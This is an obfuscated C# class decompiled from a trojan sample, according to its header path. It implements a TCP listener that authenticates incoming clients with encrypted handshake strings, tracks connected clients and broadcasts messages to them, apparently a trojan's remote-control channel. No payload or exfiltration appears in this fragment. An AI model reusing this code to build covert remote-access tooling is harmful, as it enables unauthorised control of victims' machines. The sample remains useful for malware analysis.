// Decompiled with JetBrains decompiler
// Type:  
// Assembly: CustomQueryInterfaceResult, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3C313905-EBD1-4523-EACC-B48B0BED3910
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan.MSIL.Crypt.gen-1b49da172b79de32c6df4e87385e57c0e3768b0b227b84cc38cd746b05200720.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

public sealed class \u000F\u2003
{
  public int \u0002;
  public int \u0003;
  public ArrayList \u0005;
  public int \u0008;
  [DebuggerBrowsable(DebuggerBrowsableState.Never)]
  private \u000F\u2003.\u0002 \u0006;
  private TcpListener \u000E;
  private Thread \u000F;
  private bool \u0002\u2000;

  public \u000F\u2003()
  {
    this.\u0005 = new ArrayList();
    this.\u000F = new Thread(new ThreadStart(this.\u0003));
    this.\u0002\u2000 = true;
  }

  public void \u0002(\u000F\u2003.\u0002 _param1)
  {
    \u000F\u2003.\u0002 obj = this.\u0006;
    \u000F\u2003.\u0002 comparand;
    do
    {
      comparand = obj;
      obj = Interlocked.CompareExchange<\u000F\u2003.\u0002>(ref this.\u0006, comparand + _param1, comparand);
    }
    while (obj != comparand);
  }

  public void \u0003(\u000F\u2003.\u0002 _param1)
  {
    \u000F\u2003.\u0002 obj = this.\u0006;
    \u000F\u2003.\u0002 comparand;
    do
    {
      comparand = obj;
      obj = Interlocked.CompareExchange<\u000F\u2003.\u0002>(ref this.\u0006, comparand - _param1, comparand);
    }
    while (obj != comparand);
  }

  public void \u0002()
  {
    this.\u000E = new TcpListener((IPAddress) Dns.GetHostEntry(Dns.GetHostName()).AddressList.GetValue(2), this.\u0002);
    this.\u000F.Start();
  }

  private void \u0003()
  {
    this.\u000E.Start();
    while (true)
    {
      try
      {
        \u0008\u2003 obj = new \u0008\u2003()
        {
          \u0003 = this.\u000E.AcceptTcpClient()
        };
        obj.\u0005 = obj.\u0003.GetStream();
        object Left = (object) obj.\u0002();
        if (Operators.ConditionalCompareObjectEqual(Left, (object) \u0006\u2004.\u0002(670554419), false))
        {
          obj.\u0002(\u0006\u2004.\u0002(670564024));
          this.\u0005.Add((object) obj);
          Application.OpenForms[0].Invoke((Delegate) new MethodInvoker(this.\u0006));
        }
        else if (Operators.ConditionalCompareObjectEqual(Left, (object) \u0006\u2004.\u0002(670554414), false))
        {
          obj.\u0002();
          if (Operators.ConditionalCompareObjectEqual((object) obj.\u0002(), (object) \u0006\u2004.\u0002(670554419), false))
          {
            obj.\u0002(\u0006\u2004.\u0002(670564024));
          }
          else
          {
            obj.\u0002(\u0006\u2004.\u0002(670554371));
            obj.\u0005.Close();
          }
        }
        else
        {
          obj.\u0002(\u0006\u2004.\u0002(670554371));
          obj.\u0005.Close();
        }
      }
      catch (SocketException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        if (ex.SocketErrorCode != SocketError.Interrupted)
          throw;
        else
          ProjectData.ClearProjectError();
      }
    }
  }

  public void \u0005()
  {
    this.\u000F.Abort();
    this.\u000E.Stop();
  }

  public void \u0002(string _param1)
  {
    try
    {
      foreach (\u0008\u2003 obj in this.\u0005)
        obj.\u0002(_param1);
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  public void \u0008()
  {
    try
    {
      foreach (\u0008\u2003 obj in this.\u0005)
      {
        if (obj.\u0003.Connected)
        {
          obj.\u0003.Client.Shutdown(SocketShutdown.Both);
          obj.\u0005.Close();
          obj.\u0003.Client.Close();
          obj.\u0003.Close();
        }
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u0006()
  {
    \u000F\u2003.\u0002 obj1 = this.\u0006;
    if (obj1 == null)
      return;
    \u000F\u2003.\u0002 obj2 = obj1;
    ArrayList arrayList;
    int index;
    \u0008\u2003 obj3 = (\u0008\u2003) (arrayList = this.\u0005)[index = checked (this.\u0005.Count - 1)];
    ref \u0008\u2003 local = ref obj3;
    obj2(ref local);
    arrayList[index] = (object) obj3;
  }

  public delegate void \u0002(ref \u0008\u2003 _param1);
}
